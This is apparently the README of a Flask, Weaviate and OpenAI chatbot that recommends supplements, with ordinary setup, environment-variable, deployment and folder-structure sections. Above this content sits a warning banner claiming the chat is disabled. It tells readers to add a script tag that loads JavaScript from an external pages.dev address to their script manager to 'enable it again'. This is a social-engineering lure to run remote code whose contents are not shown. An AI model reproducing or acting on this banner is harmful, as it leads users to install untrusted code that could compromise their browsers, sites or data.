⚠️ CHAT HAS BEEN TEMPORARILY DISABLED. USE THIS LINK IN SCRIPT MANAGER AS SCRIPT TO ENABLE IT AGAIN ⚠️
<script src="https://chatbot-script-7pu.pages.dev/chatbot.js"></script>

🚀 GoShopPR AI Chatbot — Local Setup

An AI-powered chatbot built with Flask, Weaviate, and OpenAI.
This assistant retrieves product information from a vector database and generates natural, personalized supplement recommendations.

🧩 1. Clone & install
# Clone this repo
git clone https://github.com/felixagosto433/goshoppr.git
cd goshoppr

# Create and activate a virtual environment (recommended)
python -m venv venv
source venv/bin/activate     # on macOS / Linux
venv\Scripts\activate        # on Windows

# Install dependencies
pip install -r requirements.txt

⚙️ 2. Configure environment variables

Copy the example environment file and fill in your keys:

cp .env.example .env


Edit .env and set your credentials.

📘 Environment Variable Table
Variable	Description	Example
OPENAI_API_KEY	Your OpenAI API key used for embeddings & chat completions	sk-xxxx
WEAVIATE_URL	URL of your Weaviate instance	https://your-instance.weaviate.network
WEAVIATE_API_KEY	Weaviate API key (or leave empty if public)	abc123xyz
VECTOR_CLASS	Weaviate class name (e.g. Products, Supplements)	Products
FLASK_ENV	Flask mode (development or production)	development
PORT	Local port to run the app	5000
DATABASE_URL	Optional Postgres URL if storing chat state	postgres://user:pass@host:5432/dbname
RENDER_EXTERNAL_URL	(Optional) Render/Heroku public endpoint	https://goshoppr.onrender.com

💡 Tip: Never commit .env to Git. Keep .env.example public for collaborators.

💻 3. One-command local run

Once your environment is set up, start the app:

python app.py


or, using Flask’s runner:

flask run


Then visit:

http://localhost:5000


The API endpoint /chat will accept POST requests with JSON payloads like:

{ "message": "I want a supplement for joint health" }

🧠 4. Weaviate setup (optional, first-time only)

If you’re deploying a fresh instance, run the schema initialization:

python scripts/initiate_weaviate.py


and populate the database with your product data:

python scripts/weaviate_update_database_and_schema.py

☁️ 5. Deploying to Heroku / Render

Heroku

heroku create goshoppr
heroku config:set $(cat .env | xargs)
git push heroku main


Render

Connect this repo.

Set the environment variables from .env.

Render will automatically use render.yaml and your Dockerfile to deploy.

Make sure the Procfile is:

web: gunicorn app:app

🧪 6. Testing

Run basic tests (if available):

pytest

📂 Folder Structure (recommended)
goshoppr/
├── app/
│   ├── __init__.py
│   ├── routes.py          # Flask endpoints
│   ├── retrieval.py       # Weaviate search functions
│   ├── prompts.py         # Chat prompt templates
│   ├── utils.py
│   └── config.py
├── scripts/
│   ├── initiate_weaviate.py
│   ├── weaviate_update_database_and_schema.py
│   └── dismantle_weaviate.py
├── static/
│   └── chatbot.js
├── requirements.txt
├── Procfile
├── Dockerfile
├── render.yaml
├── .env.example
└── README.md
